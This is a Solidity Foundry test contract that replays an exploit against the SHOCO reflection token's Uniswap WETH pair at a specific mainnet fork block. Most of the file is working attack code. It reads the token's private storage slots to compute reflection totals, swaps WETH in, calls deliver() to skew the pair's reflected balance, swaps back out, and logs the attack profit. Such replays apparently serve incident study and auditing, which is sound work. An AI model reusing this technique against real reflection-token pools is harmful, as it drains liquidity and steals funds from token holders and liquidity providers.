// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

contract SHOCOAttacker is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IUniswapV2Pair shoco_weth = IUniswapV2Pair(0x806b6C6819b1f62Ca4B66658b669f0A98e385D18);
    IReflection shoco = IReflection(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    
    function setUp() public {
        vm.createSelectFork("eth");

        vm.label(address(shoco_weth), "shoco-weth UniswapPair");
        vm.label(address(weth), "WETH");
        vm.label(address(shoco), "SHOCO");
    }

    function getMappingValue(address targetContract, uint256 mapSlot, address key) view public returns (uint256) {
        bytes32 slotValue = vm.load(targetContract, keccak256(abi.encode(key, mapSlot)));
        return uint256(slotValue);
    }
    
    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = (reserveIn *1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn * amountOut * 1000;
        uint denominator = (reserveOut-amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function testExcludePair() external {
        uint attackBlockNumber = 16440978;
        vm.rollFork(attackBlockNumber);
        console2.log("exclude pair?", shoco.isExcluded(address(shoco_weth)));
        // false
    }

    function testCondition() external {
        uint attackBlockNumber = 16440978;
        vm.rollFork(attackBlockNumber);

        uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));
        uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));
        uint256 tExcluded = getMappingValue(address(shoco), 4, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));
        uint256 rPair = getMappingValue(address(shoco), 3, address(shoco_weth));

        emit log_named_uint("SHOCO rTotal", rTotal);       // 92755547632244760386804193176548296809462337522816469006214886422157380388136
        emit log_named_uint("SHOCO rExcluded", rExcluded);  // 8156838275115295013986843616955720757118132673218460444629959325168666253906
        emit log_named_uint("SHOCO tExcluded", tExcluded);  // 87404117343064238256026
        emit log_named_uint("Pair rOwned", rPair); // 92466134384845745906067152367297685498563381326034118259801712787064725855887
        console2.log("rPair > rSupply?", rPair > rTotal-rExcluded); // true
    }

    function testExploit() external {
        uint attackBlockNumber = 16440978;
        vm.rollFork(attackBlockNumber);
        emit log_named_decimal_uint("WETH balance", weth.balanceOf(address(shoco_weth)), weth.decimals());
        deal(address(weth), address(this), 2000 ether);

        uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));
        uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));
        uint256 rAmountOut = rTotal-rExcluded;
        uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1*10**9;

        (uint reserve0, uint reserve1, ) = shoco_weth.getReserves();
        uint256 wethAmountIn = getAmountIn(shocoAmountOut, reserve1, reserve0);
        emit log_named_decimal_uint("WETH amountIn", wethAmountIn, weth.decimals());
        weth.transfer(address(shoco_weth), wethAmountIn);

        shoco_weth.swap(
            shocoAmountOut,
            0, 
            address(this),
            ""
        );

        shoco.deliver(shoco.balanceOf(address(this))*99999/100000);

        (reserve0, reserve1, ) = shoco_weth.getReserves();
        uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth))-reserve0, reserve0, reserve1);
        shoco_weth.swap(0, wethAmountOut, address(this), "");
        if (wethAmountIn < wethAmountOut) {
            emit log_named_decimal_uint("Attack profit:", wethAmountOut - wethAmountIn, weth.decimals());
        } else {
            emit log_named_decimal_uint("Attack loss:", wethAmountIn - wethAmountOut, weth.decimals());
        }
    }

    function testSwap() external {
        uint attackBlockNumber = 16440978;
        vm.rollFork(attackBlockNumber);
        uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));
        uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));
        uint256 shocoDeliver = shoco.tokenFromReflection(rTotal-rExcluded)-0.1*10**9;

        // uint256 amountOut = 1 ether;
        uint256 amountOut = 4.3 ether;
        shoco_weth.swap(shocoDeliver, amountOut, address(this), "1");
        emit log_named_decimal_uint("WETH balance", weth.balanceOf(address(this)), weth.decimals());
    }

    function uniswapV2Call(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {
        shoco.deliver(shoco.balanceOf(address(this))*99999/100000);
    }
    
}
